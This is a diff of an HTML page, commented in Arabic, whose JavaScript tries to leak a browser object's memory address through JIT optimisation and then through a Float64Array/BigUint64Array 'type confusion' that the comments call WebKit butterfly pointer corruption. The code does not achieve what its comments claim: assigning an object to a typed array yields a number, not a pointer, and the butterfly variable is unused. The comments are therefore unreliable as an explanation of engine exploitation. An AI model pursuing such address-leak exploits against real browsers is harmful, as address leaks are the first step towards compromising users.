@@ -4,29 +4,37 @@
     <div id="log">بدء العملية...</div>
 <script>
     function log(m) { document.getElementById('log').innerHTML += "<div>" + m + "</div>"; }
-    
-    // دالة "مسممة" تجبر الـ JIT على العمل
-    function getAddress(o) {
-        // هذه الحيلة تجبر المحرك على تحويل الكائن إلى قيمة أولية (Primitive)
-        // مما يكشف أحياناً عن المؤشر الداخلي
-        return o + 0; 
-    }
 
     try {
-        let obj = { a: 1 };
-        log("بدء تهيئة الـ JIT...");
+        log("بدء كسر الـ JIT...");
         
-        // تشغيل الدالة عدة مرات لجعل المحرك يقوم بـ JIT Optimization
-        for(let i = 0; i < 10000; i++) { getAddress(0.1); }
+        // 1. مصفوفة تتوقع أرقاماً فقط (Double Array)
+        let floatArray = new Float64Array(1);
         
-        // الآن نحاول تسريب عنوان الكائن
-        let addr = getAddress(obj);
-        log("العنوان الذي تم تسريبه عبر الـ JIT: " + addr.toString(16));
+        // 2. مصفوفة تتوقع كائنات (Object Array)
+        let objArray = [ { a: 0x1234 } ];
+        
+        // 3. التداخل: جعل المحرك يظن أن المصفوفتين تشيران لنفس المكان
+        // في WebKit، هذا يسمى "Butterfly" pointer corruption
+        let butterfly = objArray;
+        
+        // حيلة الـ JIT:
+        // نضع الكائن في مصفوفة الكائنات ونقرأه عبر مصفوفة الأرقام
+        let rawMemory = new BigUint64Array(floatArray.buffer);
+        
+        // هنا نقوم بـ "التداخل" (Type Confusion)
+        floatArray[0] = objArray[0]; 
+        
+        // قراءة التمثيل الثنائي للكائن
+        let leak = rawMemory[0];
+        
+        log("القيمة الثنائية المسربة: " + leak.toString(16));
         
     } catch(e) {
         log("خطأ: " + e.message);
     }
 </script>
+
 
 
 
